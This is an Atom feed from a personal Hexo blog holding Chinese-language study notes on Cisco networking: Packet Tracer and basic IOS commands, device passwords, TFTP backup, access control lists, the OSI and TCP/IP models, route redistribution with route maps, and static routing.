<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rakitic-Fans</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-08-25T13:23:19.490Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Zhairui</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CPT介绍及基本配置</title>
    <link href="http://yoursite.com/2019/09/23/CPT%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
    <id>http://yoursite.com/2019/09/23/CPT介绍及基本配置/</id>
    <published>2019-09-23T02:59:03.575Z</published>
    <updated>2019-08-25T13:23:19.490Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cisco-Packet-Tracer介绍："><a href="#Cisco-Packet-Tracer介绍：" class="headerlink" title="Cisco Packet Tracer介绍："></a>Cisco Packet Tracer介绍：</h1><p>Cisco Packet Tracer 是由Cisco公司发布的一个辅助学习工具，为学习思科网络课程的初学者去设计、配置、排除网络故障提供了网络模拟环境。用户可以在软件的图形用户界面上直接使用拖曳方法建立网络拓扑，并可提供数据包在网络中行进的详细处理过程，观察网络实时运行情况。</p><h4 id="设备及线缆："><a href="#设备及线缆：" class="headerlink" title="设备及线缆："></a>设备及线缆：</h4><p>其中含有路由器、交换机、线缆等网络设备。</p><p><strong>双绞线：</strong>直通线、交叉线、全反线</p><p><code>直通线</code>：T568B标准：白橙-橙-白绿-蓝-白蓝-绿-白棕-棕</p><p>​        两端线序：T568B-T568B</p><p><code>交叉线</code>：T568A标准：白绿-绿-白橙-蓝-白蓝-橙-白棕-棕</p><p>​        两端线序：T568B-T568A</p><p><code>全反线</code>：Console线，即串口线</p><p>​        两端线序：T568B（12345678-87654321）</p><p><strong>设备之间连线规则：</strong><code>同交异直</code>（同种设备交叉线、不同设备直通线）</p><p><strong>注：</strong><code>路由器和PC属于同种设备！！！</code></p><hr><h4 id="设备开机过程："><a href="#设备开机过程：" class="headerlink" title="设备开机过程："></a>设备开机过程：</h4><p>加电自检→从flash查找和装载IOS→从NVROM里加载启动配置文件→是否进入配置向导→直接进入配置模式</p><p><strong>特殊配置文件：</strong></p><p>startup-config（启动配置文件）  </p><p>running-config（运行配置文件）</p><hr><h4 id="基本命令操作："><a href="#基本命令操作：" class="headerlink" title="基本命令操作："></a>基本命令操作：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router&gt;//用户模式</span><br><span class="line">Router#//特权模式（在用户模式输入enable）</span><br><span class="line">Router(config)#//全局模式（在特权模式输入conf t）</span><br><span class="line">Router(config)#hostname R1//配置路由器名称</span><br><span class="line">R1(config)#interface FastEthernet 0/0//进入接口</span><br><span class="line">R1(config-if)#//接口模式</span><br><span class="line">R1(config-if)#ip address 192.168.1.1 255.255.255.0 //配置IP</span><br><span class="line">R1(config-if)#no shutdown //开启端口</span><br><span class="line">R1(config-if)#exit//退出当前模式，返回上一级模式</span><br><span class="line">R1(config-if)#end//返回特权模式</span><br><span class="line">R1#reload//重启设备</span><br></pre></td></tr></table></figure><p><strong>要点：</strong></p><p>​    ⚫命令支持简写，如enable可以简写为en</p><p>​    ⚫问号能够弹出帮助菜单</p><p>​    ⚫tab键能够补全命令，如输入en，按tab键能补全为enable</p><hr><h1 id="设备密码配置："><a href="#设备密码配置：" class="headerlink" title="设备密码配置："></a>设备密码配置：</h1><h4 id="使能加密密码："><a href="#使能加密密码：" class="headerlink" title="使能加密密码："></a>使能加密密码：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#enable password 123456//明文密码</span><br><span class="line">R1(config)#enable secret 123456//密文密码</span><br></pre></td></tr></table></figure><p><code>当明文和密文同时配置时，加密的密码优先生效</code></p><h4 id="保存配置文件："><a href="#保存配置文件：" class="headerlink" title="保存配置文件："></a>保存配置文件：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1#copy running-config startup-config</span><br><span class="line">R1#write</span><br></pre></td></tr></table></figure><p><code>两种方式均可</code></p><h4 id="查看详细配置："><a href="#查看详细配置：" class="headerlink" title="查看详细配置："></a>查看详细配置：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1#show ip interface brief//查看接口摘要信息</span><br><span class="line">R1#show running-config//查看当前的运行配置文件</span><br><span class="line">R1#show startup-config//查看启动配置文件</span><br></pre></td></tr></table></figure><p>……</p><hr><h1 id="设备管理："><a href="#设备管理：" class="headerlink" title="设备管理："></a>设备管理：</h1><h4 id="远程登录："><a href="#远程登录：" class="headerlink" title="远程登录："></a>远程登录：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#int vlan 1</span><br><span class="line">Switch(config-if)#ip add 1.1.1.1 255.255.255.0//配置管理地址</span><br><span class="line">Switch(config-if)#no shut//启用接口</span><br><span class="line">Switch(config)#line vty 0 4//进入VTY端口</span><br><span class="line">Switch(config-line)#password 123//设置登录密码</span><br><span class="line">Switch(config-line)#login//允许登录</span><br></pre></td></tr></table></figure><p><code>vty后的0 4表示同时允许5个终端连接，最多为0 15</code></p><h4 id="控制台登录："><a href="#控制台登录：" class="headerlink" title="控制台登录："></a>控制台登录：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch(config)#line console 0//进入console端口</span><br><span class="line">Switch(config-line)#password 123//设置登录密码</span><br><span class="line">Switch(config-line)#login//允许登录</span><br></pre></td></tr></table></figure><hr><h1 id="备份与还原："><a href="#备份与还原：" class="headerlink" title="备份与还原："></a>备份与还原：</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Switch#copy tftp: flash://通过tftp从服务器升级IOS</span><br><span class="line">Switch#show flash//查看IOS版本</span><br><span class="line">Switch#copy flash: tftp://通过tftp备份IOS到服务器</span><br><span class="line">Switch#copy runnning-config：tftp：//备份运行配置文件</span><br><span class="line">Switch#copy tftp：runnning-config：//还原运行配置文件</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cisco-Packet-Tracer介绍：&quot;&gt;&lt;a href=&quot;#Cisco-Packet-Tracer介绍：&quot; class=&quot;headerlink&quot; title=&quot;Cisco Packet Tracer介绍：&quot;&gt;&lt;/a&gt;Cisco Packet Tracer介
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="工具使用" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>ACL-访问控制列表</title>
    <link href="http://yoursite.com/2019/09/23/ACL/"/>
    <id>http://yoursite.com/2019/09/23/ACL/</id>
    <published>2019-09-23T02:59:03.572Z</published>
    <updated>2019-08-26T14:35:20.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ACL（访问控制列表）："><a href="#ACL（访问控制列表）：" class="headerlink" title="ACL（访问控制列表）："></a>ACL（访问控制列表）：</h1><p>访问控制列表（ACL）是一种基于包过滤的访问控制技术，它可以根据设定的条件对接口上的数据包进行过滤，允许其通过或丢弃。访问控制列表被广泛地应用于路由器和三层交换机。借助于访问控制列表，可以有效地控制用户对网络的访问，从而最大程度地保障网络安全。</p><p>ACL的基本原理：它负责管理用户配置的所有的规则，提供报文匹配规则的算法。</p><p>ACL规则的匹配： 报文到达设备后，设备从报文中提取信息，并将提取到的报文与ACL规则进行匹配，如果有提取的信息与规则匹配成功就称作命中规则，之后就停止查找，根据匹配的规则进行相应的动作； 还有可能查找完所有的匹配规则都没有一条规则能匹配成功，这称为未命中规则。</p><p>匹配过程会有两种结果，命中规则和未命中规则，命中规则中又分为命中permit(允许)规则和命中deny(拒绝)规则。</p><h3 id="ACL分类："><a href="#ACL分类：" class="headerlink" title="ACL分类："></a>ACL分类：</h3><p><strong>标准ACL：</strong></p><p>标准ACL只检查数据包的源地址，网络管理员可以使用标准ACL阻止来自某一网络的所有通信流量，或者允许来自某一特定网络的所有通信流量，或者拒绝某一协议簇（比如IP）的所有通信流量。</p><p><code>标准ACL的列表号是1~99</code></p><p><strong>扩展ACL：</strong></p><p>扩展ACL既检查数据包的源地址，也检查数据包的目的地址，同时还可以检查数据包的特定协议类型、端口号等。扩展ACL比标准ACL提供了更广泛的控制范围。例如，网络管理员如果希望做到“允许外来的Web通信流量通过，拒绝外来的FTP和Telnet等通信流量”，那么，他可以使用扩展ACL来达到目的，标准ACL不能控制这么精确。</p><p><code>扩展ACL的列表号是100~199</code></p><p><strong>命名ACL：</strong></p><p>命名访问控制列表允许在标准和扩展访问控制列表中使用名称代替表号。</p><hr><h1 id="ACL的配置："><a href="#ACL的配置：" class="headerlink" title="ACL的配置："></a>ACL的配置：</h1><h3 id="标准ACL的创建："><a href="#标准ACL的创建：" class="headerlink" title="标准ACL的创建："></a>标准ACL的创建：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#access-list 1 permit 192.168.1.10 0.0.0.255//允许网络192.168.1.10</span><br><span class="line">R1(config)#access-list 1 deny 192.168.1.10 0.0.0.255//拒绝网络192.168.1.10</span><br><span class="line">R1(config)#access-list 1 permit any//允许其他所有</span><br><span class="line">R1(config)#no access-list 1 deny 192.168.1.10 0.0.0.255//删除访问控制列表</span><br><span class="line">R1(config)#interface f0/1//进入接口</span><br><span class="line">R1(config-if)#ip accss-group 1 in/out//应用到端口</span><br><span class="line">R1(config-if)#no ip accss-group 1 in/out//取消应用到端口</span><br><span class="line">R1(config-if)#show access-list//查看访问控制列表</span><br></pre></td></tr></table></figure><p><strong>通配符掩码：</strong>也叫做反码。用二进制数0和1表示，如果某位为1，表明这一位不需要进行匹配操作，如果为0表明需要严格匹配。</p><p>隐含拒绝语句：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#access-list 1 deny 0.0.0.0  255.255.255.255</span><br></pre></td></tr></table></figure><hr><h3 id="扩展ACL的创建："><a href="#扩展ACL的创建：" class="headerlink" title="扩展ACL的创建："></a>扩展ACL的创建：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#access-list 101 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255</span><br><span class="line">//允许网络192.168.1.10访问192.168.2.0的所有服务</span><br><span class="line">R1(config)#access-list 101 deny tcp 192.168.1.0 0.0.0.255 host 192.168.2.2 eq 21</span><br><span class="line">//拒绝192.168.1.0网段访问192.168.2.2的TCP的21端口</span><br><span class="line">R1(config)#access-list 101 permit ip any any//允许其他所有</span><br><span class="line">R1(config)#access-list 101 deny icmp 192.168.1.0 0.0.0.255 host 192.168.2.2 echo</span><br><span class="line">//拒绝192.168.1.0网络ping主机192.168.2.2</span><br><span class="line">R1(config-if)#ip accss-group 101 in/out//应用到端口</span><br></pre></td></tr></table></figure><hr><h3 id="命名ACL的创建："><a href="#命名ACL的创建：" class="headerlink" title="命名ACL的创建："></a>命名ACL的创建：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#access-list standard list1//创建名为list1的标准ACL</span><br><span class="line">R1(config)#access-list extended list2//创建名为list2的扩展ACL</span><br><span class="line">R1(config-list)#permit host 192.168.1.1//允许网络</span><br><span class="line">R1(config-list)#deny any//拒绝所有</span><br><span class="line">R1(config-if)#ip accss-group list1 in/out//应用到端口</span><br></pre></td></tr></table></figure><hr><h1 id="基于时间的ACL："><a href="#基于时间的ACL：" class="headerlink" title="基于时间的ACL："></a>基于时间的ACL：</h1><p>当有些时候需要在一定时间段让ACL生效时，可以使用基于时间的ACL来实现。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">R1(config)#time-range  time1//创建一个名为time1的时间区间</span><br><span class="line">R1(config-range)#absolute start 0:00 1 oct 2019 end 0:00 8 oct 2019//建立一个时间区间范围</span><br><span class="line">R1(config-range)#periodic daily 9:00 to 17:00//建立一个周期时间范围</span><br><span class="line">R1(config-range)#periodic Thursday 9:00 to friday 17:00//建立一个周期时间范围</span><br><span class="line">R1(config)# access-list 101 deny tcp any host 192.168.1.254 eq 20 time-range time1</span><br><span class="line">//应用到ACL</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ACL（访问控制列表）：&quot;&gt;&lt;a href=&quot;#ACL（访问控制列表）：&quot; class=&quot;headerlink&quot; title=&quot;ACL（访问控制列表）：&quot;&gt;&lt;/a&gt;ACL（访问控制列表）：&lt;/h1&gt;&lt;p&gt;访问控制列表（ACL）是一种基于包过滤的访问控制技术，它可以
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>网络层次结构</title>
    <link href="http://yoursite.com/2019/09/23/%E7%BD%91%E7%BB%9C%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/"/>
    <id>http://yoursite.com/2019/09/23/网络层次结构/</id>
    <published>2019-09-23T02:59:03.570Z</published>
    <updated>2019-08-26T14:38:12.288Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OSI七层模型："><a href="#OSI七层模型：" class="headerlink" title="OSI七层模型："></a>OSI七层模型：</h1><h4 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h4><p>OSI（Open System Interconnection）,即开放系统互连，它是一种网络的参考模型，主要分为七层。</p><h4 id="基本层次："><a href="#基本层次：" class="headerlink" title="基本层次："></a>基本层次：</h4><h5 id="应用层："><a href="#应用层：" class="headerlink" title="应用层："></a>应用层：</h5><p>提供用户界面；文件、打印、消息、数据库和应用程序服务。它是用户与计算机交流的场所，仅当马上需要访问网络时，这一层才会发挥作用，是实际应用程序之间的接口，如FTP、TFTP等。</p><h5 id="表示层："><a href="#表示层：" class="headerlink" title="表示层："></a>表示层：</h5><p>表示数据进行加密等处理；数据加密、压缩和转换服务。它向应用层提供数据，并负责数据转换和代码格式化，OSI制定了相关的协议标准，这些标准定义了如何格式化标准数据。诸如数据压缩、解压缩、加密和解密等任务都与表示层有关。有些表示层标准还涉及多媒体操作。</p><h5 id="会话层："><a href="#会话层：" class="headerlink" title="会话层："></a>会话层：</h5><p>将不同应用程序的数据分离；对话控制。它负责在表示层实体之间建立、管理和终止会话，还对设备或节点之间的对话进行控制。它协调和组织系统之间的通信，为此提供了3种不同的模式：单工、半双工和全双工。总之，会话层的基本功能是将不同应用程序的数据分离。</p><h5 id="传输层："><a href="#传输层：" class="headerlink" title="传输层："></a>传输层：</h5><p>提供可靠或者不可靠的传输，在重传前执行纠错；端到端连接。它将数据进行分段并重组为数据流。位于传输层的服务将来自上层应用的数据进行分段和重组，并将它们合并到同一个数据流中。他们提供了端到端的数据传输服务，并可在互联网络上的发送主机和目标主机之间建立逻辑连接。</p><h5 id="网络层："><a href="#网络层：" class="headerlink" title="网络层："></a>网络层：</h5><p>提供逻辑地址，路由器使用它们来选择路径；路由选择。它管理设备编址、跟踪设备在网络中的位置并确定最佳的数据传输路径，网络层必须在位于不同网络中的设备之间传输数据流，路由器位于网络层，在互联网络中提供路由选择服务。</p><h5 id="数据链路层："><a href="#数据链路层：" class="headerlink" title="数据链路层："></a>数据链路层：</h5><p>将分组拆分为字节，并将字节组合成帧，使用MAC地址提供介质访问，执行错误检测，但不会纠错；成帧。IEEE以太网数据链路层包含两个子层。</p><h6 id="介质访问控制（MAC）子层（802-3）"><a href="#介质访问控制（MAC）子层（802-3）" class="headerlink" title="介质访问控制（MAC）子层（802.3）:"></a>介质访问控制（MAC）子层（802.3）:</h6><p>它定义了如何通过介质传输分组。它采用”先到先服务”的访问方式，带宽由大家共享，因此称为竟用介质访问( contention media access )。 这个子层定义了物理地址和逻辑拓扑。什么是逻辑拓扑呢?它指的是信号在物理拓扑中的传输路径。在这个子层，还可使用线路控制、错误通知(不会纠错)、顺序传递帧以及可选的流量控制。</p><h6 id="逻辑链路控制（LLC）子层（802-2）："><a href="#逻辑链路控制（LLC）子层（802-2）：" class="headerlink" title="逻辑链路控制（LLC）子层（802.2）："></a>逻辑链路控制（LLC）子层（802.2）：</h6><p>负责识别网络层协议并对其进行封装。 LLC 报头告诉数据链路层收到帧后如何对分组进行处理。其工作原理类似于：收到帧后，主机查看 LLC报头以确定要将分组交给谁，如网络层的 IP 协议 LLC 还可提供流量控制以及控制比特排序。</p><h5 id="物理层："><a href="#物理层：" class="headerlink" title="物理层："></a>物理层：</h5><p>在设备之间传输比特、指定电平、电缆速度和电缆针脚；物理拓扑，主要发送和接收比特数据。</p><h1 id="数据的封装与解封装："><a href="#数据的封装与解封装：" class="headerlink" title="数据的封装与解封装："></a>数据的封装与解封装：</h1><h4 id="封装与解封装过程："><a href="#封装与解封装过程：" class="headerlink" title="封装与解封装过程："></a>封装与解封装过程：</h4><p>(1) 用户信息被转换为数据，以便通过网络进行传输。 </p><p>(2) 数据被转换为数据段，发送主机和接收主机之间建立一条可靠的连接。 </p><p>(3) 数据段被转换为分组或数据报，逻辑地址被添加在报头中，以便能够在互联网络中路由分组。</p><p>(4) 分组或数据报被转换为帧，以便在本地网络中传输。硬件(以太网)地址被用于唯一标识本地网段中的主机。 </p><p>(5) 帧被转换为比特，并使用数字编码方法和时钟同步方案。</p><h4 id="不同层次传输数据类型："><a href="#不同层次传输数据类型：" class="headerlink" title="不同层次传输数据类型："></a>不同层次传输数据类型：</h4><p>传输层：数据以<strong>数据段</strong>的形式传输</p><p>网络层：数据以<strong>分组</strong>的形式传输</p><p>数据链路层：数据以<strong>帧</strong>的形式传输</p><p>物理层：数据以比<strong>特</strong>的形式传输</p><h1 id="TCP-IP与DOD模型"><a href="#TCP-IP与DOD模型" class="headerlink" title="TCP/IP与DOD模型:"></a>TCP/IP与DOD模型:</h1><h4 id="DoD模型与OSI模型的对应关系"><a href="#DoD模型与OSI模型的对应关系" class="headerlink" title="DoD模型与OSI模型的对应关系:"></a>DoD模型与OSI模型的对应关系:</h4><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g60lwzbs54j30al07ot8l.jpg" alt></p><h4 id="不同层次的协议："><a href="#不同层次的协议：" class="headerlink" title="不同层次的协议："></a>不同层次的协议：</h4><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g60ly1ifryj30g609u0sr.jpg" alt></p><h4 id="常用协议："><a href="#常用协议：" class="headerlink" title="常用协议："></a>常用协议：</h4><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g60lyo1zhpj30l7088t8x.jpg" alt></p><hr><h4 id="TCP："><a href="#TCP：" class="headerlink" title="TCP："></a>TCP：</h4><p>传输控制协议（TCP，Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议。</p><h5 id="TCP三次握手："><a href="#TCP三次握手：" class="headerlink" title="TCP三次握手："></a>TCP三次握手：</h5><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6dgi2myiij30el08pweg.jpg" alt></p><h6 id="第一次握手："><a href="#第一次握手：" class="headerlink" title="第一次握手："></a>第一次握手：</h6><p>建立连接时，客户端会发送SYN（同步序列编号）包（syn=j）到服务端，并进入SYN_SEND（发送）状态，等待服务端确认。</p><h6 id="第二次握手："><a href="#第二次握手：" class="headerlink" title="第二次握手："></a>第二次握手：</h6><p>服务器收到SYN包，确认客户端的SYN（ACK=j+1），同时自己也发送一个SYN包（SYN=k），即SYN+ACK包，此时服务器进入SYN_RECV（接收）状态。</p><h6 id="第三次握手："><a href="#第三次握手：" class="headerlink" title="第三次握手："></a>第三次握手：</h6><p>客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK（ack=k+1），此包发送完毕，客户端和服务端进入ESTABLISHED（连接）状态，完成三次握手。</p><p><strong>使用TCP的协议：</strong>FTP、Telnet、SMTP、HTTP、POP3</p><hr><h4 id="UDP："><a href="#UDP：" class="headerlink" title="UDP："></a>UDP：</h4><p>internet 协议集支持一个无连接的传输协议，该协议称为用户数据报协议（UDP，User Datagram Protocol）。UDP 为应用程序提供了一种无需建立连接就可以发送封装的 IP 数据报的方法，此连接方式并不可靠。</p><p><strong>常用的UDP端口号：</strong>53（DNS）、69（TFTP）、161（SNMP）</p><p><strong>使用UDP的协议：</strong>TFTP、SNMP、NFS、DNS、BOOTP</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;OSI七层模型：&quot;&gt;&lt;a href=&quot;#OSI七层模型：&quot; class=&quot;headerlink&quot; title=&quot;OSI七层模型：&quot;&gt;&lt;/a&gt;OSI七层模型：&lt;/h1&gt;&lt;h4 id=&quot;简介：&quot;&gt;&lt;a href=&quot;#简介：&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
  </entry>
  
  <entry>
    <title>路由重分布</title>
    <link href="http://yoursite.com/2019/09/23/%E8%B7%AF%E7%94%B1%E9%87%8D%E5%88%86%E5%B8%83/"/>
    <id>http://yoursite.com/2019/09/23/路由重分布/</id>
    <published>2019-09-23T02:59:03.568Z</published>
    <updated>2019-09-17T03:21:54.374Z</updated>
    
    <content type="html"><![CDATA[<h1 id="路由重分布："><a href="#路由重分布：" class="headerlink" title="路由重分布："></a>路由重分布：</h1><p>路由重分布为在同一个互连网络中高效地支持多种路由协议提供了可能，执行路由重分布的路由器被称为边界路由器，因为它们位于两个或多个自治系统的边界上。</p><p>路由重分布时度量标准和管理距离是必须要考虑的，在进行行重分布时必须转换试题标准，使得它们兼容。种子度量值（Seed Metric)是在路由生分布时定义的，它是一条通过外部重分布进来的路由的初始度量值。路由协议默认的种子度量值如下表：</p><table><thead><tr><th>路由协议</th><th>默认种子度量值</th></tr></thead><tbody><tr><td>RIP</td><td>无限大</td></tr><tr><td>EIGRP</td><td>无限大</td></tr><tr><td>OSPF</td><td>20，BGP为1</td></tr><tr><td>IS-IS</td><td>0</td></tr><tr><td>BGP</td><td>IGP的度量值</td></tr></tbody></table><p>考虑的问题：</p><p>1、路由反馈：双向重分布有可能把从一个自治系统学到的路由信息发送回该自治系统。</p><p>2、路由信息的兼容：不同路由协议的度量标准是不同的</p><p>3、收敛时间不一致</p><h1 id="路径控制概述："><a href="#路径控制概述：" class="headerlink" title="路径控制概述："></a>路径控制概述：</h1><p>为了保证网络的高效运行及在路由重分布的时候避免次优路由或者路由环路，有必要对路由更新进行控制，常用的方法有被动接口、默认路由、静态路由、路由映射表、分布列表、前缀列表、偏移列表、Cisco IOS IP服务等级协议（SLA）和策略路由。在进行路由控制时，可能是多种方法进行组合。</p><p><strong>路由映射表（Router Map）</strong></p><p>可以比做复杂的访问控制列表，主要功能包括路由控制和策略路由等。</p><p><strong>1、定义路由映射表的格式如下：</strong></p><p><strong>定义路由映射表：</strong>route-map map-tag [permit |<br>deny] [sequence-number]</p><p><strong>条件匹配：</strong></p><p>macth（常用的匹配条件包括IP地址、接口、、度量值、tag、路由类型以及数据包长度等）</p><p>如果格式为：match ip address a b c     表示逻辑或，只要有一个条件满足即可</p><p>如果格式为：match ip address a  </p><p>match ip address b  </p><p>match ip address c         表示逻辑与，必须同时满足所有条件</p><p><strong>定义行为：set</strong></p><table><thead><tr><th>Set行为</th><th>描述</th></tr></thead><tbody><tr><td>set ip next hop</td><td>设定数据包的下一跳地址</td></tr><tr><td>set interface</td><td>设定数据包出接口</td></tr><tr><td>set ip default next hop</td><td>设置默认的下一跳地址，用于当路由表里没有达到目的地址路由条目的时候</td></tr><tr><td>set ip tos</td><td>设定IP数据包的TOS值</td></tr><tr><td>set ip precedence</td><td>设定IP数据包的优先级</td></tr><tr><td>set metric</td><td>设置路由的度量值</td></tr><tr><td>set tag</td><td>设定路由的标记值</td></tr></tbody></table><p><strong>2、路由映射表有如下特征</strong></p><p>1、一个route map末尾默认行为是“deny any”</p><p>​      如执行策略路由时，没有匹配则正常转发</p><p>​      如路由重分时，没有匹配则被过滤掉</p><p>2、一个route map可以包含多个route map陈述，从上到下被执行，如route map陈述中没有math，则匹配所有。</p><p>3、序列号指定了条件执行的顺序，不写默认为10，不会自动递增</p><p>4、route map中不写permit deny默认为permit</p><p>5、在删除route map时，没写编号则删除整个route map</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;路由重分布：&quot;&gt;&lt;a href=&quot;#路由重分布：&quot; class=&quot;headerlink&quot; title=&quot;路由重分布：&quot;&gt;&lt;/a&gt;路由重分布：&lt;/h1&gt;&lt;p&gt;路由重分布为在同一个互连网络中高效地支持多种路由协议提供了可能，执行路由重分布的路由器被称为边界路由器，因为
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>路由协议介绍及静态路由</title>
    <link href="http://yoursite.com/2019/09/23/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/"/>
    <id>http://yoursite.com/2019/09/23/路由协议介绍及静态路由/</id>
    <published>2019-09-23T02:59:03.564Z</published>
    <updated>2019-08-25T13:55:31.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="路由协议："><a href="#路由协议：" class="headerlink" title="路由协议："></a>路由协议：</h1><p>路由（routing）是指分组从源到目的地时，决定端到端路径的网络范围的进程  。路由工作在OSI参考模型第三层——网络层的数据包转发设备。路由器通过转发数据包来实现网络互连。虽然路由器可以支持多种协议（如TCP/IP、IPX/SPX、AppleTalk等协议），但是在我国绝大多数路由器运行TCP/IP协议。路由器通常连接两个或多个由IP子网或点到点协议标识的逻辑端口，至少拥有1个物理端口。路由器根据收到数据包中的网络层地址以及路由器内部维护的路由表决定输出端口以及下一跳地址，并且重写链路层数据包头实现转发数据包。路由器通过动态维护路由表来反映当前的网络拓扑，并通过网络上其他路由器交换路由和链路信息来维护路由表。</p><p>为了实现路由功能，路由器应该做到：知道目的地址、分辨源从哪里学到、发现可能路由、选择最佳路由、不停地检测与维护路由信息。</p><h3 id="路由表与路由条目："><a href="#路由表与路由条目：" class="headerlink" title="路由表与路由条目："></a>路由表与路由条目：</h3><p>直连: 路由器连接到该网络</p><p>静态路由: 由系统管理员手动输入</p><p>动态路由:通过交换路由信息获得</p><p>默认路由: 静态或动态获得; 在不知道网络的明确路由时使用</p><h3 id="自治系统："><a href="#自治系统：" class="headerlink" title="自治系统："></a>自治系统：</h3><p>自治系统是通用管理域中的网络的集合，内部网关协议在自治系统中工作，外部网关协议连接不同的自治系统。</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g6c9ch6j32j30k906sadu.jpg" alt></p><h3 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h3><p><strong>静态路由：</strong></p><p>由网络管理员手动输入路由器命令管理，在小型网络中适合设置静态路由</p><p>配置方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#ip route 172.16.3.0 255.255.255.0  192.168.1.2 / f0/1</span><br><span class="line">  目标网络    目标网络掩码    下一跳地址或自身接口</span><br></pre></td></tr></table></figure><p><strong>动态路由：</strong></p><p>动态路由协议根据拓扑或流量改变而自动调整，路由器之间使用路由协议确定到达远程网络的路径，并在路由表中维护这些网络。确定路径后，路由器可以将路由协议路由到已获知的网络。常见的动态路由协议有RIP、EIGRP、OSPF等</p><p><strong>路由协议类型：</strong></p><p>路由协议的类型有距离矢量路由协议、高级距离矢量路由协议和链路状态路由协议。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;路由协议：&quot;&gt;&lt;a href=&quot;#路由协议：&quot; class=&quot;headerlink&quot; title=&quot;路由协议：&quot;&gt;&lt;/a&gt;路由协议：&lt;/h1&gt;&lt;p&gt;路由（routing）是指分组从源到目的地时，决定端到端路径的网络范围的进程  。路由工作在OSI参考模型第三层——
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="路由协议" scheme="http://yoursite.com/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
